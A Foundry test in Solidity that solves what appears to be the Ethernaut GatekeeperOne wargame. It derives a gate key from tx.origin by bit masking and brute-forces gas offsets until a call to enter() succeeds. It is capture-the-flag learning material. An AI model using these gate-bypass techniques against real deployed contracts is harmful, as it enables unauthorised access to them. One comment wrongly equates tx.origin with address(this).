//SPDX-Licence-Identifier: MIT

pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";
import {console} from "forge-std/console.sol";

contract GatekeeperOneTest is Test {
    GatekeeperOne gatekeeperOne ;
    address attacker;

    function setUp() public {
        gatekeeperOne = new GatekeeperOne();
        attacker = address(0x1234567890123456789012345678901234567890);
    }

    function testEnterGatekeeperOne() public{

        // Step 1: Calculate the gateKey that satisfies all gateThree conditions
        bytes8 gateKey  = calculateGateKey();

         // Step 2: Bypass gateOne by calling through a contract (already satisfied as we're using test contract)

         // Step 3: Bypass gateTwo by finding the right gas amount
        // We'll brute force to find the correct gas amount that makes gasleft() % 8191 == 0
        bool success;
        for (uint256 i = 0; i < 8191; i++) {   
               // Try with different gas amounts (8191 * N + offset)
            (success, ) = address(gatekeeperOne).call{gas:50000 + i}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );

            if (success){
                break;
            }
        }

         // Verify the exploit worked
         assertTrue(success, "Failed to enter Gatekeeperone");
         assertEq(gatekeeperOne.entrant(), tx.origin , "Entrant is not set correctly");
    }

    function calculateGateKey() internal view returns(bytes8){
          /*
        GateThree requirements:
        1. uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
           - This means the last 4 bytes (uint32) must equal the last 2 bytes (uint16)
           - Essentially, the 3rd and 4th bytes must be 0 (0x0000XXXX)
        
        2. uint32(uint64(_gateKey)) != uint64(_gateKey)
           - The full 8 bytes must not equal the last 4 bytes
           - So the first 4 bytes must not be all 0
        
        3. uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
           - The last 2 bytes must match the last 2 bytes of tx.origin
        */
        
        // Get the last 2 bytes of tx.origin (address(this))
        uint16 lastTwoBytes = uint16(uint160(tx.origin));

        // Construct the gateKey:
        // - First 4 bytes: any non-zero value (we'll use 0x11223344)
        // - Next 2 bytes: 0x0000 to satisfy first condition
        // - Last 2 bytes: lastTwoBytes from tx.origin
        bytes8 Key = bytes8(uint64(0x1122334400000000) | uint64(lastTwoBytes));

        return Key;
    }


}
